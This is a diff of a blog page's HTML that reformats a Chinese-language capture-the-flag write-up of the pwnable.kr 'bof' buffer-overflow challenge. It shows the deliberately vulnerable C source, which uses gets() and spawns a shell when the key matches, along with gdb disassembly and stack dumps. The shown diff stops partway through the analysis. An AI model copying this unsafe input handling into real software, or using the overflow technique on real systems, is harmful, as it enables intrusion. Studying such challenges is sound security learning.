@@ -38,7 +38,26 @@
     <meta name="description" itemprop="description" content="个人比较菜 就想分享下自己的思路和过程 如果有问题欢迎大家批评指点
 题目网站：http://pwnable.kr题目Bof      32位经典缓冲区溢出题目
 解题过程因为题目提供了源码所以先看看代码
-123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;	char overflowme[32];	printf(&quot;overflow me : &quot;);	gets(overflowme);	// smash me!	if(key == 0xcafebabe)&amp;#123;		system(&quot;/bin/sh&quot;);	&amp;#125;	else&amp;#123;		printf(&quot;Nah..\n&quot;);	&amp;#125;&amp;#125;int main(int argc, char* argv[])&amp;#123;	func(0xdeadbeef);	return 0;&amp;#125;
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+void func(int key){
+    char overflowme[32];
+    printf(&amp;quot;overflow me : &amp;quot;);
+    gets(overflowme);    // smash me!
+    if(key == 0xcafebabe){
+        system(&amp;quot;/bin/sh&amp;quot;);
+    }
+    else{
+        printf(&amp;quot;Nah..\n&amp;quot;);
+    }
+}
+int main(int argc, char* argv[]){
+    func(0xdeadbeef);
+    return 0;
+}
+
 
 ">
     <meta name="keywords" content="null,二进制漏洞利用,缓冲区溢出">
@@ -75,7 +94,26 @@
     <meta property="og:description" content="个人比较菜 就想分享下自己的思路和过程 如果有问题欢迎大家批评指点
 题目网站：http://pwnable.kr题目Bof      32位经典缓冲区溢出题目
 解题过程因为题目提供了源码所以先看看代码
-123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;	char overflowme[32];	printf(&quot;overflow me : &quot;);	gets(overflowme);	// smash me!	if(key == 0xcafebabe)&amp;#123;		system(&quot;/bin/sh&quot;);	&amp;#125;	else&amp;#123;		printf(&quot;Nah..\n&quot;);	&amp;#125;&amp;#125;int main(int argc, char* argv[])&amp;#123;	func(0xdeadbeef);	return 0;&amp;#125;
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+void func(int key){
+    char overflowme[32];
+    printf(&amp;quot;overflow me : &amp;quot;);
+    gets(overflowme);    // smash me!
+    if(key == 0xcafebabe){
+        system(&amp;quot;/bin/sh&amp;quot;);
+    }
+    else{
+        printf(&amp;quot;Nah..\n&amp;quot;);
+    }
+}
+int main(int argc, char* argv[]){
+    func(0xdeadbeef);
+    return 0;
+}
+
 
 ">
     <meta property="og:article:tag" content="二进制漏洞利用"> <meta property="og:article:tag" content="缓冲区溢出"> 
@@ -90,7 +128,26 @@
     <meta name="twitter:description" content="个人比较菜 就想分享下自己的思路和过程 如果有问题欢迎大家批评指点
 题目网站：http://pwnable.kr题目Bof      32位经典缓冲区溢出题目
 解题过程因为题目提供了源码所以先看看代码
-123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;	char overflowme[32];	printf(&quot;overflow me : &quot;);	gets(overflowme);	// smash me!	if(key == 0xcafebabe)&amp;#123;		system(&quot;/bin/sh&quot;);	&amp;#125;	else&amp;#123;		printf(&quot;Nah..\n&quot;);	&amp;#125;&amp;#125;int main(int argc, char* argv[])&amp;#123;	func(0xdeadbeef);	return 0;&amp;#125;
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+void func(int key){
+    char overflowme[32];
+    printf(&amp;quot;overflow me : &amp;quot;);
+    gets(overflowme);    // smash me!
+    if(key == 0xcafebabe){
+        system(&amp;quot;/bin/sh&amp;quot;);
+    }
+    else{
+        printf(&amp;quot;Nah..\n&amp;quot;);
+    }
+}
+int main(int argc, char* argv[]){
+    func(0xdeadbeef);
+    return 0;
+}
+
 
 ">
     <meta name="twitter:image" content="/img/favicon.png">
@@ -132,7 +189,26 @@
     "description": "个人比较菜 就想分享下自己的思路和过程 如果有问题欢迎大家批评指点
 题目网站：http://pwnable.kr题目Bof      32位经典缓冲区溢出题目
 解题过程因为题目提供了源码所以先看看代码
-123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;	char overflowme[32];	printf(&quot;overflow me : &quot;);	gets(overflowme);	// smash me!	if(key == 0xcafebabe)&amp;#123;		system(&quot;/bin/sh&quot;);	&amp;#125;	else&amp;#123;		printf(&quot;Nah..\n&quot;);	&amp;#125;&amp;#125;int main(int argc, char* argv[])&amp;#123;	func(0xdeadbeef);	return 0;&amp;#125;
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+void func(int key){
+    char overflowme[32];
+    printf(&amp;quot;overflow me : &amp;quot;);
+    gets(overflowme);    // smash me!
+    if(key == 0xcafebabe){
+        system(&amp;quot;/bin/sh&amp;quot;);
+    }
+    else{
+        printf(&amp;quot;Nah..\n&amp;quot;);
+    }
+}
+int main(int argc, char* argv[]){
+    func(0xdeadbeef);
+    return 0;
+}
+
 
 ",
     "mainEntityOfPage": {
@@ -513,20 +589,186 @@
         <p>个人比较菜 就想分享下自己的思路和过程 如果有问题欢迎大家批评指点</p>
 <h3 id="题目网站：http-pwnable-kr"><a href="#题目网站：http-pwnable-kr" class="headerlink" title="题目网站：http://pwnable.kr"></a>题目网站：<a href="http://pwnable.kr" target="_blank" rel="external">http://pwnable.kr</a></h3><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Bof      32位经典缓冲区溢出题目</p>
 <h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>因为题目提供了源码所以先看看代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</div><div class="line">	gets(overflowme);	<span class="comment">// smash me!</span></div><div class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</div><div class="line">		system(<span class="string">"/bin/sh"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">	func(<span class="number">0xdeadbeef</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">char</span> overflowme<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"overflow me : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">gets</span><span class="token punctuation">(</span>overflowme<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// smash me!</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nah..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">func</span><span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
 <ul>
 <li><a id="more"></a>
 可以看到关键点gets函数这里 可能会引起缓冲区溢出 </li>
 </ul>
-<p>接着丢bof到gdb 查看下汇编代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ disass main</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</div><div class="line">   0x0000068a &lt;+0&gt;:	push   ebp</div><div class="line">   0x0000068b &lt;+1&gt;:	mov    ebp,esp</div><div class="line">   0x0000068d &lt;+3&gt;:	and    esp,0xfffffff0</div><div class="line">   0x00000690 &lt;+6&gt;:	sub    esp,0x10</div><div class="line">   0x00000693 &lt;+9&gt;:	mov    DWORD PTR [esp],0xdeadbeef</div><div class="line">   0x0000069a &lt;+16&gt;:	call   0x62c &lt;func&gt;</div><div class="line">   0x0000069f &lt;+21&gt;:	mov    eax,0x0</div><div class="line">   0x000006a4 &lt;+26&gt;:	leave  </div><div class="line">   0x000006a5 &lt;+27&gt;:	ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
+<p>接着丢bof到gdb 查看下汇编代码</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ disass main
+Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> main:
+   0x0000068a <span class="token operator">&lt;</span>+0<span class="token operator">></span>:    push   ebp
+   0x0000068b <span class="token operator">&lt;</span>+1<span class="token operator">></span>:    mov    ebp,esp
+   0x0000068d <span class="token operator">&lt;</span>+3<span class="token operator">></span>:    and    esp,0xfffffff0
+   0x00000690 <span class="token operator">&lt;</span>+6<span class="token operator">></span>:    sub    esp,0x10
+   0x00000693 <span class="token operator">&lt;</span>+9<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0xdeadbeef
+   0x0000069a <span class="token operator">&lt;</span>+16<span class="token operator">></span>:    call   0x62c <span class="token operator">&lt;</span>func<span class="token operator">></span>
+   0x0000069f <span class="token operator">&lt;</span>+21<span class="token operator">></span>:    mov    eax,0x0
+   0x000006a4 <span class="token operator">&lt;</span>+26<span class="token operator">></span>:    leave  
+   0x000006a5 <span class="token operator">&lt;</span>+27<span class="token operator">></span>:    ret    
+End of assembler dump.
+</code></pre>
 <p>当0xdeadbeef作为参数传递时，它会在调用func之前添加到堆栈中  然后在这里下断查看下它在哪</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">gdb-peda$ b *main+16</div><div class="line">Breakpoint 1 at 0x69a</div><div class="line">gdb-peda$ r</div><div class="line">Starting program: /home/ios/bof </div><div class="line"></div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0xf7fb9dbc --&gt; 0xffffd13c --&gt; 0xffffd31a (<span class="string">"XDG_VTNR=7"</span>)</div><div class="line">EBX: 0x0 </div><div class="line">ECX: 0x5bca2c32 </div><div class="line">EDX: 0xffffd0c4 --&gt; 0x0 </div><div class="line">ESI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EDI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EBP: 0xffffd098 --&gt; 0x0 </div><div class="line">ESP: 0xffffd080 --&gt; 0xdeadbeef </div><div class="line">EIP: 0x5655569a (&lt;main+16&gt;:	call   0x5655562c &lt;func&gt;)</div><div class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x5655568d &lt;main+3&gt;:	and    esp,0xfffffff0</div><div class="line">   0x56555690 &lt;main+6&gt;:	sub    esp,0x10</div><div class="line">   0x56555693 &lt;main+9&gt;:	mov    DWORD PTR [esp],0xdeadbeef</div><div class="line">=&gt; 0x5655569a &lt;main+16&gt;:	call   0x5655562c &lt;func&gt;</div><div class="line">   0x5655569f &lt;main+21&gt;:	mov    eax,0x0</div><div class="line">   0x565556a4 &lt;main+26&gt;:	leave  </div><div class="line">   0x565556a5 &lt;main+27&gt;:	ret    </div><div class="line">   0x565556a6:	nop</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xdeadbeef </div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd080 --&gt; 0xdeadbeef </div><div class="line">0004| 0xffffd084 (<span class="string">"PRUV\271VUV"</span>)</div><div class="line">0008| 0xffffd088 --&gt; 0x565556b9 (&lt;__libc_csu_init+9&gt;:	add    ebx,0x193b)</div><div class="line">0012| 0xffffd08c --&gt; 0x0 </div><div class="line">0016| 0xffffd090 --&gt; 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">0020| 0xffffd094 --&gt; 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">0024| 0xffffd098 --&gt; 0x0 </div><div class="line">0028| 0xffffd09c --&gt; 0xf7e20637 (&lt;__libc_start_main+247&gt;:	add    esp,0x10)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 1, 0x5655569a <span class="keyword">in</span> main ()</div></pre></td></tr></table></figure>
-<p>可以看到，传入func之前他在ESP: 0xffffd080 –&gt; 0xdeadbeef<br>然后汇编看下func<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ disass func</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> func:</div><div class="line">   0x5655562c &lt;+0&gt;:	push   ebp</div><div class="line">   0x5655562d &lt;+1&gt;:	mov    ebp,esp</div><div class="line">   0x5655562f &lt;+3&gt;:	sub    esp,0x48</div><div class="line">   0x56555632 &lt;+6&gt;:	mov    eax,gs:0x14</div><div class="line">   0x56555638 &lt;+12&gt;:	mov    DWORD PTR [ebp-0xc],eax</div><div class="line">   0x5655563b &lt;+15&gt;:	xor    eax,eax</div><div class="line">   0x5655563d &lt;+17&gt;:	mov    DWORD PTR [esp],0x5655578c</div><div class="line">   0x56555644 &lt;+24&gt;:	call   0xf7e67140 &lt;puts&gt;</div><div class="line">   0x56555649 &lt;+29&gt;:	lea    eax,[ebp-0x2c]</div><div class="line">   0x5655564c &lt;+32&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">   0x5655564f &lt;+35&gt;:	call   0xf7e66890 &lt;gets&gt;</div><div class="line">   0x56555654 &lt;+40&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe</div><div class="line">   0x5655565b &lt;+47&gt;:	jne    0x5655566b &lt;func+63&gt;</div><div class="line">   0x5655565d &lt;+49&gt;:	mov    DWORD PTR [esp],0x5655579b</div><div class="line">   0x56555664 &lt;+56&gt;:	call   0xf7e42940 &lt;system&gt;</div><div class="line">   0x56555669 &lt;+61&gt;:	jmp    0x56555677 &lt;func+75&gt;</div><div class="line">   0x5655566b &lt;+63&gt;:	mov    DWORD PTR [esp],0x565557a3</div><div class="line">   0x56555672 &lt;+70&gt;:	call   0xf7e67140 &lt;puts&gt;</div><div class="line">   0x56555677 &lt;+75&gt;:	mov    eax,DWORD PTR [ebp-0xc]</div><div class="line">   0x5655567a &lt;+78&gt;:	xor    eax,DWORD PTR gs:0x14</div><div class="line">   0x56555681 &lt;+85&gt;:	je     0x56555688 &lt;func+92&gt;</div><div class="line">   0x56555683 &lt;+87&gt;:	call   0xf7efd790 &lt;__stack_chk_fail&gt;</div><div class="line">   0x56555688 &lt;+92&gt;:	leave  </div><div class="line">   0x56555689 &lt;+93&gt;:	ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
-<p>在    0x56555654 &lt;+40&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe 处 下断<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ n</div><div class="line">overflow me : </div><div class="line">AAAAAAAAAA</div><div class="line"></div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">EBX: 0x0 </div><div class="line">ECX: 0xf7fb85a0 --&gt; 0xfbad2288 </div><div class="line">EDX: 0xf7fb987c --&gt; 0x0 </div><div class="line">ESI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EDI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EBP: 0xffffd078 --&gt; 0xffffd098 --&gt; 0x0 </div><div class="line">ESP: 0xffffd030 --&gt; 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">EIP: 0x56555654 (&lt;func+40&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe)</div><div class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x56555649 &lt;func+29&gt;:	lea    eax,[ebp-0x2c]</div><div class="line">   0x5655564c &lt;func+32&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">   0x5655564f &lt;func+35&gt;:	call   0xf7e66890 &lt;gets&gt;</div><div class="line">=&gt; 0x56555654 &lt;func+40&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe</div><div class="line">   0x5655565b &lt;func+47&gt;:	jne    0x5655566b &lt;func+63&gt;</div><div class="line">   0x5655565d &lt;func+49&gt;:	mov    DWORD PTR [esp],0x5655579b</div><div class="line">   0x56555664 &lt;func+56&gt;:	call   0xf7e42940 &lt;system&gt;</div><div class="line">   0x56555669 &lt;func+61&gt;:	jmp    0x56555677 &lt;func+75&gt;</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd030 --&gt; 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">0004| 0xffffd034 --&gt; 0xffffd0d4 --&gt; 0xd28e2a50 </div><div class="line">0008| 0xffffd038 --&gt; 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">0012| 0xffffd03c --&gt; 0xd267 </div><div class="line">0016| 0xffffd040 --&gt; 0xffffffff </div><div class="line">0020| 0xffffd044 --&gt; 0x2f (<span class="string">'/'</span>)</div><div class="line">0024| 0xffffd048 --&gt; 0xf7e14dc8 --&gt; 0x2b76 (<span class="string">'v+'</span>)</div><div class="line">0028| 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 2, 0x56555654 <span class="keyword">in</span> func ()</div><div class="line">`</div></pre></td></tr></table></figure></p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">
+gdb-peda$ b *main+16
+Breakpoint 1 at 0x69a
+gdb-peda$ r
+Starting program: /home/ios/bof 
+
+<span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>
+EAX: 0xf7fb9dbc --<span class="token operator">></span> 0xffffd13c --<span class="token operator">></span> 0xffffd31a <span class="token punctuation">(</span><span class="token string">"XDG_VTNR=7"</span><span class="token punctuation">)</span>
+EBX: 0x0 
+ECX: 0x5bca2c32 
+EDX: 0xffffd0c4 --<span class="token operator">></span> 0x0 
+ESI: 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
+EDI: 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
+EBP: 0xffffd098 --<span class="token operator">></span> 0x0 
+ESP: 0xffffd080 --<span class="token operator">></span> 0xdeadbeef 
+EIP: 0x5655569a <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+16<span class="token operator">></span>:    call   0x5655562c <span class="token operator">&lt;</span>func<span class="token operator">></span><span class="token punctuation">)</span>
+EFLAGS: 0x282 <span class="token punctuation">(</span>carry parity adjust zero SIGN <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>
+   0x5655568d <span class="token operator">&lt;</span>main+3<span class="token operator">></span>:    and    esp,0xfffffff0
+   0x56555690 <span class="token operator">&lt;</span>main+6<span class="token operator">></span>:    sub    esp,0x10
+   0x56555693 <span class="token operator">&lt;</span>main+9<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0xdeadbeef
+<span class="token operator">=</span><span class="token operator">></span> 0x5655569a <span class="token operator">&lt;</span>main+16<span class="token operator">></span>:    call   0x5655562c <span class="token operator">&lt;</span>func<span class="token operator">></span>
+   0x5655569f <span class="token operator">&lt;</span>main+21<span class="token operator">></span>:    mov    eax,0x0
+   0x565556a4 <span class="token operator">&lt;</span>main+26<span class="token operator">></span>:    leave  
+   0x565556a5 <span class="token operator">&lt;</span>main+27<span class="token operator">></span>:    ret    
+   0x565556a6:    nop
+Guessed arguments:
+arg<span class="token punctuation">[</span>0<span class="token punctuation">]</span>: 0xdeadbeef 
+<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>
+0000<span class="token operator">|</span> 0xffffd080 --<span class="token operator">></span> 0xdeadbeef 
+0004<span class="token operator">|</span> 0xffffd084 <span class="token punctuation">(</span><span class="token string">"PRUV\271VUV"</span><span class="token punctuation">)</span>
+0008<span class="token operator">|</span> 0xffffd088 --<span class="token operator">></span> 0x565556b9 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init+9<span class="token operator">></span>:    add    ebx,0x193b<span class="token punctuation">)</span>
+0012<span class="token operator">|</span> 0xffffd08c --<span class="token operator">></span> 0x0 
+0016<span class="token operator">|</span> 0xffffd090 --<span class="token operator">></span> 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
+0020<span class="token operator">|</span> 0xffffd094 --<span class="token operator">></span> 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
+0024<span class="token operator">|</span> 0xffffd098 --<span class="token operator">></span> 0x0 
+0028<span class="token operator">|</span> 0xffffd09c --<span class="token operator">></span> 0xf7e20637 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main+247<span class="token operator">></span>:    add    esp,0x10<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x5655569a <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>可以看到，传入func之前他在ESP: 0xffffd080 –&gt; 0xdeadbeef<br>然后汇编看下func</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ disass func
+Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> func:
+   0x5655562c <span class="token operator">&lt;</span>+0<span class="token operator">></span>:    push   ebp
+   0x5655562d <span class="token operator">&lt;</span>+1<span class="token operator">></span>:    mov    ebp,esp
+   0x5655562f <span class="token operator">&lt;</span>+3<span class="token operator">></span>:    sub    esp,0x48
+   0x56555632 <span class="token operator">&lt;</span>+6<span class="token operator">></span>:    mov    eax,gs:0x14
+   0x56555638 <span class="token operator">&lt;</span>+12<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax
+   0x5655563b <span class="token operator">&lt;</span>+15<span class="token operator">></span>:    xor    eax,eax
+   0x5655563d <span class="token operator">&lt;</span>+17<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x5655578c
+   0x56555644 <span class="token operator">&lt;</span>+24<span class="token operator">></span>:    call   0xf7e67140 <span class="token operator">&lt;</span>puts<span class="token operator">></span>
+   0x56555649 <span class="token operator">&lt;</span>+29<span class="token operator">></span>:    lea    eax,<span class="token punctuation">[</span>ebp-0x2c<span class="token punctuation">]</span>
+   0x5655564c <span class="token operator">&lt;</span>+32<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
+   0x5655564f <span class="token operator">&lt;</span>+35<span class="token operator">></span>:    call   0xf7e66890 <span class="token operator">&lt;</span>gets<span class="token operator">></span>
+   0x56555654 <span class="token operator">&lt;</span>+40<span class="token operator">></span>:    <span class="token function">cmp</span>    DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>,0xcafebabe
+   0x5655565b <span class="token operator">&lt;</span>+47<span class="token operator">></span>:    jne    0x5655566b <span class="token operator">&lt;</span>func+63<span class="token operator">></span>
+   0x5655565d <span class="token operator">&lt;</span>+49<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x5655579b
+   0x56555664 <span class="token operator">&lt;</span>+56<span class="token operator">></span>:    call   0xf7e42940 <span class="token operator">&lt;</span>system<span class="token operator">></span>
+   0x56555669 <span class="token operator">&lt;</span>+61<span class="token operator">></span>:    jmp    0x56555677 <span class="token operator">&lt;</span>func+75<span class="token operator">></span>
